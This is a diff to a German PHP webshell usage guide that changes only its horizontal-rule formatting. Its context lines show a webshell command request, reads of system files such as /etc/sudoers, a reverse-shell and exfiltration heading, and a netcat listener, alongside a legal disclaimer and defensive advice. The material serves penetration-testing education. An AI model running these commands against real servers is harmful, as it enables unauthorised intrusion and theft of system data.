@@ -1,6 +1,6 @@
 # 🐚 PHP WebShell Usage Guide
 
----
+
 
 ## Inhaltsverzeichnis
 
@@ -13,7 +13,7 @@
 - [Siehe auch](#siehe-auch)
 - [Haftungsausschluss](#haftungsausschluss)
 
----
+
 
 ## Einleitung
 
@@ -22,7 +22,7 @@ Eine **PHP-Webshell** ist eine serverseitige Datei (z. B. `.php`), die einem A
 > ⚠️ **Wichtiger Hinweis:**  
 > Dieses Wissen dient ausschließlich der **legalen Sicherheitsforschung**, für **CTFs**, **Testumgebungen** (wie HackTheBox/TryHackMe) oder autorisierte Penetration Tests. Jegliche nicht autorisierte Anwendung ist strafbar.
 
----
+
 
 ## Beispiel einer einfachen PHP Webshell
 
@@ -47,7 +47,7 @@ Zugriff erfolgt z. B. über:
 http://target/uploads/shell.php?cmd=whoami
 ```
 
----
+
 
 <div align=right>
 
@@ -86,7 +86,7 @@ cat /etc/sudoers
 netstat -anp             # Ports & Prozesse
 ```
 
----
+
 
 <div align=right>
 
@@ -103,7 +103,7 @@ which python
 ```
 Mit einem gefundenen Tool kann eine Reverse Shell aufgebaut werden.
 
----
+
 
 ## Daten exfiltrieren oder Reverse Shell starten
 Beispiel mit Netcat (wenn vorhanden):
@@ -121,7 +121,7 @@ Oder über eine PHP-gestützte Reverse Shell:
 > 🔁 Den Angriff auf Port 4444 lauschen: 
 `nc -lvnp 4444`
 
----
+
 
 <div align=right>
 
@@ -136,7 +136,7 @@ Oder über eine PHP-gestützte Reverse Shell:
     - .php, .phtml, .inc etc. blockieren oder als reine Textdateien behandeln.
     - Monitoring-Tools wie OSSEC, Wazuh, LMD (Linux Malware Detect) verwenden.
 
----
+
 
 ## Siehe auch:
 
@@ -145,7 +145,7 @@ Oder über eine PHP-gestützte Reverse Shell:
 - [https://github.com/bitRaybytes/cybersecurity/blob/main/03-web-security/cmd_examples_from_shell.md](https://github.com/bitRaybytes/cybersecurity/blob/main/03-web-security/cmd_examples_from_shell.md)
 - [https://github.com/bitRaybytes/cybersecurity/blob/main/03-web-security/webshells/php_rce_cheat_sheet.md](https://github.com/bitRaybytes/cybersecurity/blob/main/03-web-security/webshells/php_rce_cheat_sheet.md)
 
----
+
 
 ## Haftungsausschluss
 
